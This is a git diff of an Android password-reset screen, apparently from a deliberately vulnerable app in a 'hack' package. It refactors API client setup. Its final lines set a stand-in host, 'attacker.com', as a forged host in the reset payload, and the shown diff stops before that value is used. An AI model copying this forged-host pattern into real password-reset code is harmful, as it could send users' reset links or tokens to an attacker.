@@ -10,9 +10,9 @@ import androidx.appcompat.app.AppCompatActivity;
 
 import com.google.android.material.textfield.TextInputEditText;
 import com.google.android.material.textfield.TextInputLayout;
+import com.mobility.hack.MainApplication;
 import com.mobility.hack.R;
 import com.mobility.hack.network.ApiService;
-import com.mobility.hack.network.RetrofitClient;
 import com.mobility.hack.security.TokenManager;
 
 import org.jetbrains.annotations.NotNull;
@@ -23,7 +23,6 @@ import java.util.Map;
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
-import retrofit2.Retrofit;
 
 public class FindPasswordActivity extends AppCompatActivity {
     private ApiService apiService;
@@ -33,20 +32,25 @@ public class FindPasswordActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_find_password);
-        tokenManager = new TokenManager(getApplicationContext());
-        Retrofit retrofit = RetrofitClient.getClient(tokenManager);
-        apiService = retrofit.create(ApiService.class);
+
+        // MainApplication에서 ApiService 및 TokenManager 인스턴스 가져오기
+        apiService = ((MainApplication) getApplication()).getApiService();
+        tokenManager = ((MainApplication) getApplication()).getTokenManager();
+
         TextInputLayout usernameInputLayout = findViewById(R.id.textInputLayoutUsername);
         TextInputLayout emailInputLayout = findViewById(R.id.textInputLayoutEmail);
         TextInputEditText usernameEditText = findViewById(R.id.editTextUsername);
         TextInputEditText emailEditText = findViewById(R.id.editTextEmail);
         Button requestResetButton = findViewById(R.id.buttonRequestReset);
+
         addTextWatcher(usernameEditText, usernameInputLayout);
         addTextWatcher(emailEditText, emailInputLayout);
+
         requestResetButton.setOnClickListener(v -> {
             String username = usernameEditText.getText().toString();
             String email = emailEditText.getText().toString();
             boolean hasError = false;
+
             if (username.isEmpty()) {
                 usernameInputLayout.setError("아이디를 입력해주세요.");
                 hasError = true;
@@ -56,6 +60,7 @@ public class FindPasswordActivity extends AppCompatActivity {
                 hasError = true;
             }
             if (hasError) return;
+
             // [수정] 서버의 요구사항에 맞춰 username과 email을 모두 전달
             String forgedHost = "attacker.com";
             Map<String, String> payload = new HashMap<>();
